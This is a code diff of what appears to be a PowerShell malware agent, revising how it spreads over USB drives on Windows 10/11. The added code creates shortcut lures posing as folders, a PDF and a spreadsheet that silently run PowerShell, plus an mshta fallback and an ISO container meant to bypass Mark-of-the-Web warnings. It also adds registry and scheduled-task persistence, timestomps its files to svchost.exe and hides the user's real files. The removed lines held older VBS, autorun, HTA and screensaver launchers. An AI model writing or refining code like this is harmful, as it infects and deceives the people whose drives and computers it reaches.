@@ -90,20 +90,70 @@ function Install-Stealth{
   }catch{}
 }
 
-# ── USB spreading ─────────────────────────────────────────────────────────────
+# ── USB spreading (modern Windows 10/11) ──────────────────────────────────────
+# Strategy: LNK → powershell.exe directly (no VBS/wscript in chain)
+#           ISO container for MOTW bypass
+#           mshta.exe fallback
+# autorun.inf / VBS removed — both dead on Win8+, flagged by Defender
 function Get-Drives{try{return(Get-WmiObject Win32_LogicalDisk -EA SilentlyContinue|?{$_.DriveType -eq 2}|Select -Exp DeviceID)}catch{return @()}}
 
 function _Make-LNK($LnkPath,$Target,$Args="",$IconDll="shell32.dll",$IconIdx=3){
-  # Build a .lnk shortcut using WScript.Shell COM (no extra tools needed)
   try{
     $ws=New-Object -ComObject WScript.Shell
     $sc=$ws.CreateShortcut($LnkPath)
     $sc.TargetPath=$Target
     $sc.Arguments=$Args
     $sc.IconLocation="$IconDll,$IconIdx"
-    $sc.WindowStyle=7   # SW_SHOWMINNOACTIVE — minimised, off taskbar
+    $sc.WindowStyle=7   # SW_SHOWMINNOACTIVE — window never appears
     $sc.Save()
     return $true
+  }catch{return $false}
+}
+
+function _Make-ISOContainer($D,$dst){
+  # Build an ISO that contains a copy of the agent + LNK lures.
+  # Files inside an ISO have no Mark-of-the-Web — SmartScreen won't warn.
+  # Requires mkisofs / genisoimage (via WSL) or oscdimg (Windows ADK).
+  # Falls back silently if unavailable.
+  try{
+    $isoStage="$env:TEMP\.iso_stage_$AID"
+    New-Item -ItemType Directory -Path $isoStage -Force|Out-Null
+    Copy-Item $dst "$isoStage\SyncEngine.ps1" -Force
+    $psExe="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+    $psArgs="-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"SyncEngine.ps1`""
+    # LNK lures inside the ISO point to powershell relative to the mounted volume
+    $lures=@(
+      @{N="Documents.lnk";     I="shell32.dll,4"},
+      @{N="Photos.lnk";        I="imageres.dll,108"},
+      @{N="Backup.lnk";        I="shell32.dll,4"},
+      @{N="Project Files.lnk"; I="shell32.dll,4"}
+    )
+    foreach($l in $lures){
+      try{
+        $ws=New-Object -ComObject WScript.Shell
+        $sc=$ws.CreateShortcut("$isoStage\$($l.N)")
+        $sc.TargetPath=$psExe
+        $sc.Arguments=$psArgs
+        $sc.IconLocation=$l.I
+        $sc.WindowStyle=7
+        $sc.WorkingDirectory="%CD%"
+        $sc.Save()
+      }catch{}
+    }
+    $isoOut="$D\Drive_Backup.iso"
+    # Try oscdimg (Windows ADK — often present on corporate machines)
+    $oscdimg="${env:ProgramFiles(x86)}\Windows Kits\10\Assessment and Deployment Kit\Deployment Tools\amd64\Oscdimg\oscdimg.exe"
+    if(Test-Path $oscdimg){
+      & $oscdimg -n -m "$isoStage" "$isoOut" 2>$null
+    }
+    # Try mkisofs via WSL
+    elseif(Get-Command wsl -EA SilentlyContinue){
+      $stageWsl=(wsl wslpath -u "$isoStage") 2>$null
+      $outWsl=(wsl wslpath -u "$isoOut") 2>$null
+      if($stageWsl -and $outWsl){wsl mkisofs -quiet -o "$outWsl" "$stageWsl" 2>$null}
+    }
+    Remove-Item $isoStage -Recurse -Force -EA SilentlyContinue
+    return (Test-Path $isoOut)
   }catch{return $false}
 }
 
@@ -115,88 +165,81 @@ function Spread-Drive($D){
     $dst="$hd\SyncEngine.ps1"
     Copy-Item $PSCommandPath $dst -Force -EA SilentlyContinue
 
-    # Timestomp both dir + payload to match svchost.exe
+    # Timestomp to match svchost.exe
     $ref=Get-Item "$env:SystemRoot\System32\svchost.exe" -Force -EA SilentlyContinue
     if($ref){
-      $f=Get-Item $dst -Force -EA SilentlyContinue
-      if($f){$f.LastWriteTime=$ref.LastWriteTime;$f.CreationTime=$ref.CreationTime}
-      $d2=Get-Item $hd -Force -EA SilentlyContinue
-      if($d2){$d2.LastWriteTime=$ref.LastWriteTime}
+      foreach($tgt in @($dst,$hd)){
+        $fi=Get-Item $tgt -Force -EA SilentlyContinue
+        if($fi){try{$fi.LastWriteTime=$ref.LastWriteTime;$fi.CreationTime=$ref.CreationTime}catch{}}
+      }
     }
     (Get-Item $hd  -Force -EA SilentlyContinue).Attributes="Hidden,System"
     (Get-Item $dst -Force -EA SilentlyContinue).Attributes="Hidden,System"
 
-    # ── 2. VBS fast-deploy (copies to disk + 3 persistence methods instantly) ─
-    $vbsDst="$hd\_deploy.vbs"
-    $psCmd="powershell -WindowStyle hidden -NonInteractive -ExecutionPolicy Bypass -File `"$dst`""
-    $vbs=@"
-Set sh=CreateObject("WScript.Shell")
-Set fs=CreateObject("Scripting.FileSystemObject")
-tmp=sh.ExpandEnvironmentStrings("%TEMP%") & "\SyncUpdate.ps1"
-apd=sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\SyncEngineDatabase"
-inst=apd & "\SyncEngine.ps1"
-On Error Resume Next
-fs.CopyFile "$dst", tmp, True
-If Not fs.FolderExists(apd) Then fs.CreateFolder(apd)
-fs.CopyFile tmp, inst, True
-sh.Run "cmd /c attrib +h +s """ & inst & """", 0, False
-sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SyncEngineHost", "powershell -WindowStyle hidden -ExecutionPolicy Bypass -File """ & inst & """", "REG_SZ"
-sh.Run "schtasks /create /tn MicrosoftSyncEngineTask /tr ""powershell -WindowStyle hidden -ExecutionPolicy Bypass -File """& inst &""""" /sc onlogon /rl highest /f", 0, False
-sh.Run "powershell -WindowStyle hidden -ExecutionPolicy Bypass -File """ & inst & """", 0, False
-sh.Run "explorer """ & "$D" & """", 1, False
-"@
-    $vbs|Out-File $vbsDst -Encoding ascii -Force -EA SilentlyContinue
-    (Get-Item $vbsDst -Force -EA SilentlyContinue).Attributes="Hidden,System"
-    if($ref){$fv=Get-Item $vbsDst -Force -EA SilentlyContinue;if($fv){$fv.LastWriteTime=$ref.LastWriteTime}}
+    $psExe="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+    # Inline deploy command: copy to AppData + persist + run + open Explorer
+    $apd="$env:APPDATA\Microsoft\Windows\SyncEngineDatabase"
+    $inst="$apd\SyncEngine.ps1"
+    # Single-line PS command baked into the LNK argument
+    $inlineCmd="-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "+
+      "`"New-Item -ItemType Directory -Path '$apd' -Force|Out-Null;"+
+      "Copy-Item '$dst' '$inst' -Force;"+
+      "(Get-Item '$inst' -Force).Attributes='Hidden';"+
+      "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SyncEngineHost' -Value 'powershell -WindowStyle hidden -ExecutionPolicy Bypass -File `\`"$inst`\`"' -Force;"+
+      "schtasks /create /tn MicrosoftSyncEngineTask /tr 'powershell -WindowStyle hidden -ExecutionPolicy Bypass -File `\`"$inst`\`"' /sc onlogon /rl highest /f 2>`$null;"+
+      "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File `\`"$inst`\`"' -WindowStyle Hidden;"+
+      "Start-Process explorer '$D'`""
 
-    # ── 3. autorun.inf → VBS (older Windows / AutoPlay) ──────────────────────
-    $ar="$D\autorun.inf"
-    "[AutoRun]`r`nopen=wscript.exe `"$vbsDst`"`r`nshellexecute=wscript.exe `"$vbsDst`"`r`nlabel=USB Drive`r`nicon=shell32.dll,8`r`n"|Out-File $ar -Encoding ascii -Force -EA SilentlyContinue
-    (Get-Item $ar -Force -EA SilentlyContinue).Attributes="Hidden,System"
-    if($ref){$fa=Get-Item $ar -Force -EA SilentlyContinue;if($fa){$fa.LastWriteTime=$ref.LastWriteTime}}
-
-    # ── 4. HTA backup launcher (works even if wscript disabled) ──────────────
-    $htaDst="$D\Setup.hta"
-    "<HTA:APPLICATION WINDOWSTATE=`"minimize`" SHOWINTASKBAR=`"no`" CAPTION=`"no`"><script language=`"VBScript`">Sub Window_OnLoad`r`nCreateObject(`"WScript.Shell`").Run `"wscript.exe `"`"$vbsDst`"`"`",0,False`r`nwindow.close`r`nEnd Sub</script><body></body></HTA>"|Out-File $htaDst -Encoding ascii -Force -EA SilentlyContinue
-
-    # ── 5. LNK folder-icon lures (most convincing click vector) ───────────────
+    # ── 2. LNK lures → powershell.exe (primary modern vector) ────────────────
     $lures=@(
-      @{Name="Documents";   Icon="shell32.dll,4"},
-      @{Name="Photos";      Icon="imageres.dll,108"},
-      @{Name="Backup";      Icon="shell32.dll,4"},
-      @{Name="Open Drive";  Icon="shell32.dll,8"}
+      @{N="Documents.lnk";       I="shell32.dll,4"},
+      @{N="Photos.lnk";          I="imageres.dll,108"},
+      @{N="Backup.lnk";          I="shell32.dll,4"},
+      @{N="Project Files.lnk";   I="shell32.dll,4"},
+      @{N="Resume 2024.pdf.lnk"; I="shell32.dll,70"},   # fake PDF
+      @{N="Invoice.xlsx.lnk";    I="shell32.dll,70"}    # fake spreadsheet
     )
     foreach($l in $lures){
-      $lp="$D\$($l.Name).lnk"
       try{
         $ws=New-Object -ComObject WScript.Shell
-        $sc=$ws.CreateShortcut($lp)
-        $sc.TargetPath="wscript.exe"
-        $sc.Arguments="`"$vbsDst`""
-        $sc.IconLocation=$l.Icon
+        $sc=$ws.CreateShortcut("$D\$($l.N)")
+        $sc.TargetPath=$psExe
+        $sc.Arguments=$inlineCmd
+        $sc.IconLocation=$l.I
         $sc.WindowStyle=7
         $sc.Save()
       }catch{}
     }
 
-    # ── 6. .scr screensaver lure (autoruns on some systems, bypasses some AVs) ─
+    # ── 3. mshta.exe lure — backup when PS ExecutionPolicy blocks scripts ────
+    # mshta executes JScript/VBScript inline, mostly unmonitored on older configs
+    $mshtaLnk="$D\Setup.lnk"
+    $mshtaCmd="mshta.exe vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"$psExe $inlineCmd"""",0:close"")"
     try{
-      $scrDst="$D\SlideShow.scr"
-      Copy-Item $vbsDst $scrDst -Force -EA SilentlyContinue
+      $ws=New-Object -ComObject WScript.Shell
+      $sc=$ws.CreateShortcut($mshtaLnk)
+      $sc.TargetPath="$env:SystemRoot\System32\mshta.exe"
+      $sc.Arguments="vbscript:Execute(`"CreateObject(`"WScript.Shell`").Run `"$psExe $inlineCmd`",0:close`")"
+      $sc.IconLocation="shell32.dll,8"
+      $sc.WindowStyle=7
+      $sc.Save()
     }catch{}
 
-    # ── 7. desktop.ini — makes drive look like a System folder in Explorer ────
+    # ── 4. ISO container — MOTW bypass (SmartScreen won't warn on files inside) ─
+    _Make-ISOContainer $D $dst | Out-Null
+
+    # ── 5. desktop.ini — drive appears as Documents system folder in Explorer ──
     try{
       $dini="$D\desktop.ini"
-      "[.ShellClassInfo]`r`nCLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}`r`nFlags=2`r`n"|Out-File $dini -Encoding unicode -Force -EA SilentlyContinue
+      "[.ShellClassInfo]`r`nCLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}`r`nFlags=2`r`nInfoTip=Contains your documents`r`nIconResource=$env:SystemRoot\system32\shell32.dll,4`r`n[ViewState]`r`nMode=`r`nVid=`r`nFolderType=Documents`r`n"|Out-File $dini -Encoding unicode -Force -EA SilentlyContinue
       (Get-Item $dini -Force -EA SilentlyContinue).Attributes="Hidden,System"
       (Get-Item $D    -Force -EA SilentlyContinue).Attributes="ReadOnly,System"
     }catch{}
 
-    # ── 8. Hide existing real files so lures are the only visible items ────────
+    # ── 6. Hide real files so only lures are visible ──────────────────────────
     try{
       Get-ChildItem $D -Force -EA SilentlyContinue|
-        Where-Object{$_.Name -notmatch '\.lnk$|desktop\.ini|autorun\.inf|Setup\.hta|SlideShow\.scr'}|
+        Where-Object{$_.Name -notmatch '\.lnk$|desktop\.ini|\.iso$'}|
         ForEach-Object{try{$_.Attributes="Hidden"}catch{}}
     }catch{}
 
